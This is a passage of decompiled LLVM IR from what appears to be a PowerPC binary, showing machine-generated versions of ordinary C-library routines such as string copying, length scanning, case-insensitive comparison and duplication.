  %v3_10007460 = icmp eq i8 %v3_1000745c, 0
  store i1 %v3_10007460, i1* %cr7_eq.global-to-local, align 1
  %v3_10007464 = add i32 %v2_1000743c, 3
  %v4_10007464 = inttoptr i32 %v3_10007464 to i8*
  store i8 %v3_1000745c, i8* %v4_10007464, align 1
  store i32 %v3_10007464, i32* %r11.global-to-local, align 4
  %v0_10007468 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007468, label %dec_label_pc_10007484, label %dec_label_pc_1000746c

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_1000745c
  %v0_1000746c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000746c = add i32 %v0_1000746c, 1
  %v2_1000746c = inttoptr i32 %v1_1000746c to i8*
  %v3_1000746c = load i8, i8* %v2_1000746c, align 1
  %v3_10007470 = icmp eq i8 %v3_1000746c, 0
  store i1 %v3_10007470, i1* %cr7_eq.global-to-local, align 1
  %v3_10007474 = add i32 %v2_1000743c, 4
  %v4_10007474 = inttoptr i32 %v3_10007474 to i8*
  store i8 %v3_1000746c, i8* %v4_10007474, align 1
  store i32 %v3_10007474, i32* %r11.global-to-local, align 4
  %v0_10007478 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007478, label %dec_label_pc_10007484, label %dec_label_pc_1000747c

dec_label_pc_1000747c:                            ; preds = %dec_label_pc_1000746c
  %v0_1000747c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000747c = add i32 %v0_1000747c, -1
  store i32 %v1_1000747c, i32* %ctr.global-to-local, align 4
  %v2_1000747c = icmp eq i32 %v1_1000747c, 0
  br i1 %v2_1000747c, label %dec_label_pc_10007498, label %dec_label_pc_1000742c

dec_label_pc_10007484:                            ; preds = %dec_label_pc_1000746c, %dec_label_pc_1000745c, %dec_label_pc_10007448, %dec_label_pc_1000742c
  %v1_10007484 = phi i32 [ %v3_10007474, %dec_label_pc_1000746c ], [ %v3_10007464, %dec_label_pc_1000745c ], [ %v3_10007454, %dec_label_pc_10007448 ], [ %v3_1000743c, %dec_label_pc_1000742c ]
  %v2_1000748411 = sub i32 %arg1, %v1_10007484
  %v2_10007488 = add i32 %v2_1000748411, %arg2
  %v1_1000748c = add i32 %v2_10007488, -1
  store i32 %v1_1000748c, i32* %r9.global-to-local, align 4
  %v4_1000748c = icmp eq i32 %v1_1000748c, 0
  %v0_10007490 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000748c, i32 %v0_10007490)
  %v2_100074c8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100074c0

dec_label_pc_10007498:                            ; preds = %dec_label_pc_1000747c, %dec_label_pc_10007418
  %v1_10007498 = urem i32 %arg2, 4
  store i32 %v1_10007498, i32* %r9.global-to-local, align 4
  %v3_10007498 = icmp eq i32 %v1_10007498, 0
  %v0_1000749c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007498, i32 %v0_1000749c)
  store i32 %v1_10007498, i32* %ctr.global-to-local, align 4
  %v2_100074b4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100074a4

dec_label_pc_100074a4:                            ; preds = %dec_label_pc_100074bc.dec_label_pc_100074a4_crit_edge, %dec_label_pc_10007498
  %v2_100074b4 = phi i32 [ %v3_100074b4, %dec_label_pc_100074bc.dec_label_pc_100074a4_crit_edge ], [ %v2_100074b4.pre, %dec_label_pc_10007498 ]
  %v0_100074a8 = phi i32 [ %v0_100074a8.pre, %dec_label_pc_100074bc.dec_label_pc_100074a4_crit_edge ], [ %v1_10007498, %dec_label_pc_10007498 ]
  %v0_100074a4 = load i32, i32* @r4, align 4
  %v1_100074a4 = inttoptr i32 %v0_100074a4 to i8*
  %v2_100074a4 = load i8, i8* %v1_100074a4, align 1
  %v1_100074a8 = add i32 %v0_100074a8, -1
  store i32 %v1_100074a8, i32* %r9.global-to-local, align 4
  %v1_100074ac = add i32 %v0_100074a4, 1
  store i32 %v1_100074ac, i32* @r4, align 4
  %v3_100074b0 = icmp eq i8 %v2_100074a4, 0
  store i1 %v3_100074b0, i1* %cr7_eq.global-to-local, align 1
  %v3_100074b4 = add i32 %v2_100074b4, 1
  %v4_100074b4 = inttoptr i32 %v3_100074b4 to i8*
  store i8 %v2_100074a4, i8* %v4_100074b4, align 1
  store i32 %v3_100074b4, i32* %r11.global-to-local, align 4
  %v0_100074b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100074b8 = add i32 %v0_100074b8, -1
  store i32 %v1_100074b8, i32* %ctr.global-to-local, align 4
  %v2_100074b8 = icmp eq i32 %v1_100074b8, 0
  br i1 %v2_100074b8, label %dec_label_pc_100074d0, label %dec_label_pc_100074bc

dec_label_pc_100074bc:                            ; preds = %dec_label_pc_100074a4
  %v0_100074bc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100074bc, label %dec_label_pc_100074c0, label %dec_label_pc_100074bc.dec_label_pc_100074a4_crit_edge

dec_label_pc_100074bc.dec_label_pc_100074a4_crit_edge: ; preds = %dec_label_pc_100074bc
  %v0_100074a8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100074a4

dec_label_pc_100074c0:                            ; preds = %dec_label_pc_100074bc, %dec_label_pc_10007484
  %v2_100074c8.pre = phi i32 [ %v2_100074c8.pre.pre, %dec_label_pc_10007484 ], [ %v3_100074b4, %dec_label_pc_100074bc ]
  %v0_100074c0 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_100074c0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100074c4

dec_label_pc_100074c4:                            ; preds = %dec_label_pc_100074c4, %dec_label_pc_100074c0
  %v2_100074c8 = phi i32 [ %v3_100074c8, %dec_label_pc_100074c4 ], [ %v2_100074c8.pre, %dec_label_pc_100074c0 ]
  %v3_100074c8 = add i32 %v2_100074c8, 1
  %v4_100074c8 = inttoptr i32 %v3_100074c8 to i8*
  store i8 0, i8* %v4_100074c8, align 1
  store i32 %v3_100074c8, i32* %r11.global-to-local, align 4
  %v0_100074cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100074cc = add i32 %v0_100074cc, -1
  store i32 %v1_100074cc, i32* %ctr.global-to-local, align 4
  %v2_100074cc = icmp eq i32 %v1_100074cc, 0
  br i1 %v2_100074cc, label %dec_label_pc_100074d0, label %dec_label_pc_100074c4

dec_label_pc_100074d0:                            ; preds = %dec_label_pc_100074a4, %dec_label_pc_100074c4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100074cc, { 1, 0 }
  uselistorder i32 %v3_100074c8, { 1, 2, 0 }
  uselistorder i32 %v1_100074b8, { 1, 0 }
  uselistorder i32 %v3_100074b4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10007498, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000747c, { 1, 0 }
  uselistorder i32 %v3_10007474, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100074d0, { 1, 0 }
}

define i32 @function_100074d4(i8* %arg1) local_unnamed_addr {
dec_label_pc_100074d4:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100074d4 = load i32, i32* @r4, align 4
  %v3_100074d4 = icmp eq i32 %v0_100074d4, 0
  %v0_100074e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100074d4, i32 %v0_100074e0)
  %v1_100074f0 = load i32, i32* @r4, align 4
  %v2_100074f0 = add i32 %v1_100074f0, %tmp
  %v3_100074f4 = icmp ugt i32 %v2_100074f0, %tmp
  %v4_100074f4 = icmp eq i32 %v1_100074f0, 0
  %v2_100074f8 = or i1 %v4_100074f4, %v3_100074f4
  br i1 %v2_100074f8, label %dec_label_pc_10007500, label %dec_label_pc_100074fc

dec_label_pc_100074e8:                            ; preds = %dec_label_pc_10007568
  br label %dec_label_pc_100075ac

dec_label_pc_100074fc:                            ; preds = %dec_label_pc_100074d4
  br label %dec_label_pc_10007500

dec_label_pc_10007500:                            ; preds = %dec_label_pc_100074d4, %dec_label_pc_100074fc
  %v0_100075b0 = phi i32 [ %v2_100074f0, %dec_label_pc_100074d4 ], [ -1, %dec_label_pc_100074fc ]
  %v1_100075306 = urem i32 %tmp, 4
  %v3_100075308 = icmp eq i32 %v1_100075306, 0
  br i1 %v3_100075308, label %dec_label_pc_10007538, label %dec_label_pc_10007508

dec_label_pc_10007508:                            ; preds = %dec_label_pc_10007500, %dec_label_pc_1000752c
  %v0_10007520 = phi i32 [ %v1_1000752c, %dec_label_pc_1000752c ], [ %tmp, %dec_label_pc_10007500 ]
  %v1_10007508 = inttoptr i32 %v0_10007520 to i8*
  %v2_10007508 = load i8, i8* %v1_10007508, align 1
  %v3_1000750c = icmp eq i8 %v2_10007508, 0
  br i1 %v3_1000750c, label %dec_label_pc_10007514, label %dec_label_pc_1000752c

dec_label_pc_10007514:                            ; preds = %dec_label_pc_10007508
  %v3_10007514 = icmp ugt i32 %v0_100075b0, %v0_10007520
  %v0_10007520.v0_100075b0 = select i1 %v3_10007514, i32 %v0_10007520, i32 %v0_100075b0
  %v2_10007524 = sub i32 %v0_10007520.v0_100075b0, %tmp
  ret i32 %v2_10007524

dec_label_pc_1000752c:                            ; preds = %dec_label_pc_10007508
  %v1_1000752c = add i32 %v0_10007520, 1
  %v1_10007530 = urem i32 %v1_1000752c, 4
  %v3_10007530 = icmp eq i32 %v1_10007530, 0
  br i1 %v3_10007530, label %dec_label_pc_10007538, label %dec_label_pc_10007508

dec_label_pc_10007538:                            ; preds = %dec_label_pc_1000752c, %dec_label_pc_10007500
  %v0_1000753c = phi i32 [ %tmp, %dec_label_pc_10007500 ], [ %v1_1000752c, %dec_label_pc_1000752c ]
  %v2_100075a43 = icmp ult i32 %v0_1000753c, %v0_100075b0
  br i1 %v2_100075a43, label %dec_label_pc_10007548, label %dec_label_pc_100075ac

dec_label_pc_10007548:                            ; preds = %dec_label_pc_10007538, %dec_label_pc_100075a0
  %v0_100074e8 = phi i32 [ %v1_1000754c, %dec_label_pc_100075a0 ], [ %v0_1000753c, %dec_label_pc_10007538 ]
  %v1_10007548 = inttoptr i32 %v0_100074e8 to i32*
  %v2_10007548 = load i32, i32* %v1_10007548, align 4
  %v1_1000754c = add i32 %v0_100074e8, 4
  %v1_10007558 = add i32 %v2_10007548, -16843009
  %v2_1000755c = and i32 %v1_10007558, -2139062144
  %v5_1000755c = icmp eq i32 %v2_1000755c, 0
  %v1_10007560 = add i32 %v0_100074e8, 1
  br i1 %v5_1000755c, label %dec_label_pc_100075a0, label %dec_label_pc_10007568

dec_label_pc_10007568:                            ; preds = %dec_label_pc_10007548
  %v2_10007568 = inttoptr i32 %v0_100074e8 to i8*
  %v3_10007568 = load i8, i8* %v2_10007568, align 1
  %v3_1000756c = icmp eq i8 %v3_10007568, 0
  br i1 %v3_1000756c, label %dec_label_pc_100074e8, label %dec_label_pc_10007574

dec_label_pc_10007574:                            ; preds = %dec_label_pc_10007568
  %v2_10007574 = inttoptr i32 %v1_10007560 to i8*
  %v3_10007574 = load i8, i8* %v2_10007574, align 1
  %v3_10007578 = icmp eq i8 %v3_10007574, 0
  br i1 %v3_10007578, label %dec_label_pc_100075ac, label %dec_label_pc_10007580

dec_label_pc_10007580:                            ; preds = %dec_label_pc_10007574
  %v1_10007580 = add i32 %v0_100074e8, 2
  %v2_10007580 = inttoptr i32 %v1_10007580 to i8*
  %v3_10007580 = load i8, i8* %v2_10007580, align 1
  %v3_10007588 = icmp eq i8 %v3_10007580, 0
  br i1 %v3_10007588, label %dec_label_pc_100075ac, label %dec_label_pc_10007590

dec_label_pc_10007590:                            ; preds = %dec_label_pc_10007580
  %v1_10007590 = add i32 %v0_100074e8, 3
  %v2_10007590 = inttoptr i32 %v1_10007590 to i8*
  %v3_10007590 = load i8, i8* %v2_10007590, align 1
  %v3_10007598 = icmp eq i8 %v3_10007590, 0
  br i1 %v3_10007598, label %dec_label_pc_100075ac, label %dec_label_pc_100075a0

dec_label_pc_100075a0:                            ; preds = %dec_label_pc_10007590, %dec_label_pc_10007548
  %v2_100075a4 = icmp ult i32 %v1_1000754c, %v0_100075b0
  br i1 %v2_100075a4, label %dec_label_pc_10007548, label %dec_label_pc_100075ac

dec_label_pc_100075ac:                            ; preds = %dec_label_pc_100075a0, %dec_label_pc_10007574, %dec_label_pc_10007580, %dec_label_pc_10007590, %dec_label_pc_10007538, %dec_label_pc_100074e8
  %v0_100075b8 = phi i32 [ %v0_100074e8, %dec_label_pc_100074e8 ], [ %v0_1000753c, %dec_label_pc_10007538 ], [ %v1_10007590, %dec_label_pc_10007590 ], [ %v1_10007580, %dec_label_pc_10007580 ], [ %v1_10007560, %dec_label_pc_10007574 ], [ %v0_100075b0, %dec_label_pc_100075a0 ]
  %v3_100075ac = icmp ugt i32 %v0_100075b0, %v0_100075b8
  %v0_100075b8.v0_100075b0 = select i1 %v3_100075ac, i32 %v0_100075b8, i32 %v0_100075b0
  %v2_100075bc = sub i32 %v0_100075b8.v0_100075b0, %tmp
  ret i32 %v2_100075bc

; uselistorder directives
  uselistorder i32 %v1_1000754c, { 1, 0 }
  uselistorder i32 %v0_100074e8, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_1000753c, { 1, 0, 2 }
  uselistorder i32 %v1_1000752c, { 1, 0, 2 }
  uselistorder i32 %v0_10007520, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100075b0, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_100074f0, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_100075ac, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10007548, { 1, 0 }
  uselistorder label %dec_label_pc_10007508, { 1, 0 }
  uselistorder label %dec_label_pc_10007500, { 1, 0 }
}

define i32 @function_100075c4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100075c4:
  store i32 %arg1, i32* @r4, align 4
  store i32 268465628, i32* @lr, align 4
  %v0_100075d8 = call i32 @function_100075f4()
  %v0_100075e0 = load i32, i32* @r29, align 4
  ret i32 %v0_100075e0
}

define i32 @function_100075f4() local_unnamed_addr {
dec_label_pc_100075f4:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_100075f4 = load i32, i32* @r3, align 4
  %v2_100075f4 = icmp ugt i32 %v0_100075f4, 124
  %v0_10007604 = load i32, i32* @r4, align 4
  store i32 %v0_10007604, i32* %r27.global-to-local, align 4
  %v0_1000760c = load i32, i32* @r5, align 4
  br i1 %v2_100075f4, label %dec_label_pc_10007650, label %dec_label_pc_10007614

dec_label_pc_10007614:                            ; preds = %dec_label_pc_100075f4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e680.255 to i32), i32* %r30.global-to-local, align 4
  %v3_100076307 = icmp eq i32 %v0_100075f4, 0
  br i1 %v3_100076307, label %dec_label_pc_10007644, label %dec_label_pc_10007624

dec_label_pc_10007624:                            ; preds = %dec_label_pc_10007614, %dec_label_pc_10007624
  %v0_10007628 = phi i32 [ %v1_10007628, %dec_label_pc_10007624 ], [ ptrtoint ([8 x i8]* @global_var_1000e680.255 to i32), %dec_label_pc_10007614 ]
  %v1_10007628 = add i32 %v0_10007628, 1
  store i32 %v1_10007628, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007624

dec_label_pc_10007644:                            ; preds = %dec_label_pc_10007614
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007684

dec_label_pc_10007650:                            ; preds = %dec_label_pc_100075f4
  %tmp = icmp slt i32 %v0_100075f4, 0
  %v1_10007654 = zext i1 %tmp to i32
  %v2_10007654 = ashr i32 %v0_100075f4, 31
  %v3_10007654 = and i32 %v2_10007654, -2
  %v4_10007654 = or i32 %v3_10007654, %v1_10007654
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_10007668 = bitcast i32* %stack_var_-39 to i8*
  %v6_10007668 = call i32 @function_1000a06c(i8* %v5_10007668, i32 %v4_10007654, i32 %v0_100075f4, i32 -10, i32 0)
  %v1_10007670 = add i32 %v6_10007668, -14
  store i32 %v1_10007670, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000e670.256 to i32), i32* @r4, align 4
  store i32 %v1_10007670, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268465796, i32* @lr, align 4
  %v0_10007680 = call i32 @function_10007108()
  %v0_10007684.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_10007688.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10007698.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007684

dec_label_pc_10007684:                            ; preds = %dec_label_pc_10007644, %dec_label_pc_10007650
  %v0_10007698 = phi i32 [ %v0_1000760c, %dec_label_pc_10007644 ], [ %v0_10007698.pre, %dec_label_pc_10007650 ]
  %v0_10007688 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000e680.255 to i32), %dec_label_pc_10007644 ], [ %v0_10007688.pre, %dec_label_pc_10007650 ]
  %v1_1000768c = phi i32 [ %v0_10007604, %dec_label_pc_10007644 ], [ %v0_10007684.pre, %dec_label_pc_10007650 ]
  %tmp19 = icmp slt i32 %v1_1000768c, 0
  %v1_10007684 = zext i1 %tmp19 to i32
  %v2_10007684 = ashr i32 %v1_1000768c, 31
  %v3_10007684 = and i32 %v2_10007684, -2
  %v4_10007684 = or i32 %v3_10007684, %v1_10007684
  store i32 %v0_10007688, i32* @r3, align 4
  %v2_1000768c = xor i32 %v4_10007684, %v1_1000768c
  %v2_10007690 = sub i32 %v4_10007684, %v2_1000768c
  %tmp20 = icmp slt i32 %v2_10007690, 0
  %v1_10007694 = zext i1 %tmp20 to i32
  %v2_10007694 = ashr i32 %v2_10007690, 31
  %v3_10007694 = and i32 %v2_10007694, -2
  %v4_10007694 = or i32 %v3_10007694, %v1_10007694
  %v2_10007698 = and i32 %v4_10007694, %v0_10007698
  store i32 %v2_10007698, i32* @r29, align 4
  %v0_1000769c = call i32 @function_10007288()
  %v1_100076a0 = add i32 %v0_1000769c, 1
  store i32 %v1_100076a0, i32* %r31.global-to-local, align 4
  %v1_100076a4 = load i32, i32* @r29, align 4
  %v3_100076a4 = icmp ugt i32 %v1_100076a0, %v1_100076a4
  br i1 %v3_100076a4, label %dec_label_pc_100076ac, label %dec_label_pc_100076b4

dec_label_pc_100076ac:                            ; preds = %dec_label_pc_10007684
  store i32 %v1_100076a4, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100076b4

dec_label_pc_100076b4:                            ; preds = %dec_label_pc_10007684, %dec_label_pc_100076ac
  %v0_100076c4 = phi i32 [ %v1_100076a4, %dec_label_pc_100076ac ], [ %v1_100076a0, %dec_label_pc_10007684 ]
  %v3_100076b4 = icmp eq i32 %v0_100076c4, 0
  br i1 %v3_100076b4, label %dec_label_pc_100076d8, label %dec_label_pc_100076bc

dec_label_pc_100076bc:                            ; preds = %dec_label_pc_100076b4
  %v0_100076bc = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100076bc, i32* @r4, align 4
  %v0_100076c0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100076c0, i32* @r3, align 4
  store i32 %v0_100076c4, i32* @r5, align 4
  store i32 268465868, i32* @lr, align 4
  %v0_100076c8 = call i32 @function_10007108()
  %v1_100076cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100076cc = add i32 %v1_100076cc, %v0_100076c0
  %v3_100076d4 = add i32 %v2_100076cc, -1
  %v4_100076d4 = inttoptr i32 %v3_100076d4 to i8*
  store i8 0, i8* %v4_100076d4, align 1
  br label %dec_label_pc_100076d8

dec_label_pc_100076d8:                            ; preds = %dec_label_pc_100076b4, %dec_label_pc_100076bc
  %v0_100076d8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100076d8 = icmp eq i32 %v0_100076d8, 0
  br i1 %v3_100076d8, label %dec_label_pc_100076e8, label %dec_label_pc_100076e0

dec_label_pc_100076e0:                            ; preds = %dec_label_pc_100076d8
  %v0_100076e0 = call i32 @function_10004e38()
  %v0_100076e4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100076e4 = inttoptr i32 %v0_100076e0 to i32*
  store i32 %v0_100076e4, i32* %v2_100076e4, align 4
  %v0_100076ec.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100076e8

dec_label_pc_100076e8:                            ; preds = %dec_label_pc_100076d8, %dec_label_pc_100076e0
  %v0_100076ec = phi i32 [ 0, %dec_label_pc_100076d8 ], [ %v0_100076ec.pre, %dec_label_pc_100076e0 ]
  ret i32 %v0_100076ec

; uselistorder directives
  uselistorder i32 %v2_10007690, { 1, 0 }
  uselistorder i32 %v4_10007684, { 1, 0 }
  uselistorder i32 %v1_1000768c, { 1, 2, 0 }
  uselistorder i32 %v1_10007628, { 1, 0 }
  uselistorder i32 %v0_100075f4, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000e680.255 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_100076e8, { 1, 0 }
  uselistorder label %dec_label_pc_100076d8, { 1, 0 }
  uselistorder label %dec_label_pc_100076b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007684, { 1, 0 }
  uselistorder label %dec_label_pc_10007624, { 1, 0 }
}

define i32 @function_10007700(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007700:
  %v2_1000770c = call i32 @function_1000a960(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000770c
}

define i32 @function_10007710(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007710:
  %v3_10007714 = load i32, i32* bitcast (i32** @global_var_10010454.257 to i32*), align 4
  %v0_1000771c.pre = load i32, i32* @r3, align 4
  %v1_1000771c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000771c

dec_label_pc_1000771c:                            ; preds = %dec_label_pc_10007744, %dec_label_pc_10007710
  %v0_100077586 = phi i32 [ %v0_100077587, %dec_label_pc_10007744 ], [ 0, %dec_label_pc_10007710 ]
  %v0_10007748 = phi i32 [ %v1_10007748, %dec_label_pc_10007744 ], [ %v1_1000771c.pre, %dec_label_pc_10007710 ]
  %v0_1000774c = phi i32 [ %v1_1000774c, %dec_label_pc_10007744 ], [ %v0_1000771c.pre, %dec_label_pc_10007710 ]
  %v4_1000771c = icmp eq i32 %v0_1000774c, %v0_10007748
  %.pre = inttoptr i32 %v0_1000774c to i8*
  br i1 %v4_1000771c, label %dec_label_pc_10007744, label %dec_label_pc_10007724

dec_label_pc_10007724:                            ; preds = %dec_label_pc_1000771c
  %v2_10007724 = load i8, i8* %.pre, align 1
  %v3_10007724 = zext i8 %v2_10007724 to i32
  %v1_10007728 = inttoptr i32 %v0_10007748 to i8*
  %v2_10007728 = load i8, i8* %v1_10007728, align 1
  %v3_10007728 = zext i8 %v2_10007728 to i32
  %v1_1000772c = mul nuw nsw i32 %v3_10007724, 2
  %v1_10007730 = mul nuw nsw i32 %v3_10007728, 2
  %v2_10007734 = add i32 %v1_1000772c, %v3_10007714
  %v3_10007734 = inttoptr i32 %v2_10007734 to i16*
  %v4_10007734 = load i16, i16* %v3_10007734, align 2
  %v5_10007734 = sext i16 %v4_10007734 to i32
  %v2_10007738 = add i32 %v1_10007730, %v3_10007714
  %v3_10007738 = inttoptr i32 %v2_10007738 to i16*
  %v4_10007738 = load i16, i16* %v3_10007738, align 2
  %v5_10007738 = sext i16 %v4_10007738 to i32
  %v2_1000773c = sub nsw i32 %v5_10007734, %v5_10007738
  %v4_10007740 = icmp eq i16 %v4_10007734, %v4_10007738
  br i1 %v4_10007740, label %dec_label_pc_10007744, label %dec_label_pc_10007758

dec_label_pc_10007744:                            ; preds = %dec_label_pc_1000771c, %dec_label_pc_10007724
  %v0_100077587 = phi i32 [ %v2_1000773c, %dec_label_pc_10007724 ], [ %v0_100077586, %dec_label_pc_1000771c ]
  %v2_10007744 = load i8, i8* %.pre, align 1
  %v1_10007748 = add i32 %v0_10007748, 1
  %v1_1000774c = add i32 %v0_1000774c, 1
  %v3_10007750 = icmp eq i8 %v2_10007744, 0
  br i1 %v3_10007750, label %dec_label_pc_10007758, label %dec_label_pc_1000771c

dec_label_pc_10007758:                            ; preds = %dec_label_pc_10007744, %dec_label_pc_10007724
  %v0_10007758 = phi i32 [ %v0_100077587, %dec_label_pc_10007744 ], [ %v2_1000773c, %dec_label_pc_10007724 ]
  ret i32 %v0_10007758

; uselistorder directives
  uselistorder i32 %v2_1000773c, { 1, 0 }
  uselistorder i32 %v0_1000774c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007744, { 1, 0 }
}

define i32 @function_10007760(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007760:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10007774 = call i32 @function_10007288()
  %v1_10007778 = add i32 %v0_10007774, 1
  store i32 %v1_10007778, i32* @r29, align 4
  store i32 %v1_10007778, i32* @r3, align 4
  store i32 268466052, i32* @lr, align 4
  %v0_10007780 = call i32 @function_100080a0()
  store i32 %v0_10007780, i32* @r3, align 4
  %v0_10007784 = load i32, i32* @r28, align 4
  store i32 %v0_10007784, i32* @r4, align 4
  store i32 %v0_10007780, i32* @r31, align 4
  %v3_10007788 = icmp eq i32 %v0_10007780, 0
  %v0_1000778c = load i32, i32* @r29, align 4
  store i32 %v0_1000778c, i32* @r5, align 4
  br i1 %v3_10007788, label %dec_label_pc_10007798, label %dec_label_pc_10007794

dec_label_pc_10007794:                            ; preds = %dec_label_pc_10007760
  store i32 268466072, i32* @lr, align 4
  %v0_10007794 = call i32 @function_10007108()
  %v0_1000779c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007798

dec_label_pc_10007798:                            ; preds = %dec_label_pc_10007760, %dec_label_pc_10007794
  %v0_1000779c = phi i32 [ 0, %dec_label_pc_10007760 ], [ %v0_1000779c.pre, %dec_label_pc_10007794 ]
  ret i32 %v0_1000779c

; uselistorder directives
  uselistorder label %dec_label_pc_10007798, { 1, 0 }
}

define i32 @function_100077b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100077b0:
  store i32 ptrtoint (i32* @global_var_1001049c.258 to i32), i32* @r5, align 4
  %v1_100077b8 = call i32 @function_1000ac34(i32 ptrtoint (i32* @global_var_1001049c.258 to i32))
  ret i32 %v1_100077b8
}

define i32 @function_100077bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_100077bc:
  %stack_var_-72 = alloca i32, align 4
  store i32 268466128, i32* @lr, align 4
  %v2_100077cc = call i32 @function_100077e8(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @function_100077e8, { 1, 0 }
}

define i32 @function_100077e8(i32* %arg1) local_unnamed_addr {
dec_label_pc_100077e8:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100077ec = load i32, i32* @lr, align 4
  store i32 %v0_100077ec, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100077fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268466192, i32* @lr, align 4
  %v3_1000780c = call i32 @function_100049cc(i32 1076655123, i32 %v2_100077fc, i32 %v2_100077fc)
  %v2_10007810 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10007810, i32* @r4, align 4
  store i32 %v3_1000780c, i32* @r30, align 4
  %v3_10007814 = icmp eq i32 %v3_1000780c, 0
  store i32 19, i32* @r5, align 4
  %v0_1000781c = load i32, i32* @r31, align 4
  br i1 %v3_10007814, label %dec_label_pc_10007824, label %dec_label_pc_1000786c

dec_label_pc_10007824:                            ; preds = %dec_label_pc_100077e8
  %v1_1000781c = add i32 %v0_1000781c, 17
  %v3_1000783c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000783c, i32* %r0.global-to-local, align 4
  %v2_10007840 = add i32 %v0_1000781c, 4
  %v3_10007840 = inttoptr i32 %v2_10007840 to i32*
  store i32 %tmp7, i32* %v3_10007840, align 4
  %v0_10007844 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007844 = load i32, i32* @r31, align 4
  %v2_10007844 = inttoptr i32 %v1_10007844 to i32*
  store i32 %v0_10007844, i32* %v2_10007844, align 4
  %v0_10007848 = load i32, i32* %r11.global-to-local, align 4
